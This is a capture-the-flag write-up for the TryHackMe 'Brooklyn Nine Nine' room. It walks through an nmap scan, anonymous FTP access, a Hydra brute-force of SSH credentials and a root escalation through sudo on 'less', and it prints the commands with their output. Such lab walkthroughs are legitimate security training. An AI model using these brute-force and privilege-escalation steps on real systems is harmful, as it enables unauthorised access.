# Brookly Nine Nine

Tryhackme room link : [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

## Nmap scan

`nmap -T 4 -sV 10.10.125.55`

```

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:56 EDT
Nmap scan report for 10.10.125.55
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.89 seconds
```

## FTP 

Lets try `anonymous` login

`ftp 10.10.125.55`

```

Connected to 10.10.125.55.
220 (vsFTPd 3.0.3)
Name (10.10.125.55:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We were logged in ftp

```

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```

Lets transfer the `note_to_jake.txt` to local machine and read its content

```

ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (1019.3942 kB/s)
```

`cat note_to_jake.txt `

```

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

We get three users **jake** , **holt** and **amy** . Since the text is about Jake's weak password, we might be able to get ssh access with Jake, lets check

## Hydra 

using hydra for user `jake` for ssh login password

`hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.125.55 ssh`

```

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-26 11:14:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.125.55:22/

[22][ssh] host: 10.10.125.55   login: jake   password: *********

1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-26 11:14:54
```

## SSH

`ssh jake@10.10.125.55`

```

The authenticity of host '10.10.125.55 (10.10.125.55)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.125.55' (ECDSA) to the list of known hosts.
jake@10.10.125.55's password: 
Last login: Tue May 26 08:56:58 2020
```

lets check for user.txt file

```

jake@brookly_nine_nine:~$ find / -type f -name user.txt 2>/dev/null
/home/holt/user.txt
```

### user.txt 

```

jake@brookly_nine_nine:~$ cat /home/holt/user.txt
*********************************
```

lets check for root.txt

`find / -type f -name root.txt 2>/dev/null`

we get nothing

## Privilege Escalation

lets check for sudo permission for `jake`

`sudo -l`

```

Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

**use GTFOBins for less command**

```

sudo less /etc/profile
!/bin/sh
```

using this we got the root access

```

# whoami
root
# cd /root
# ls
root.txt
# cat roo.txt
cat: roo.txt: No such file or directory
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: ***********************************

Enjoy!!
```
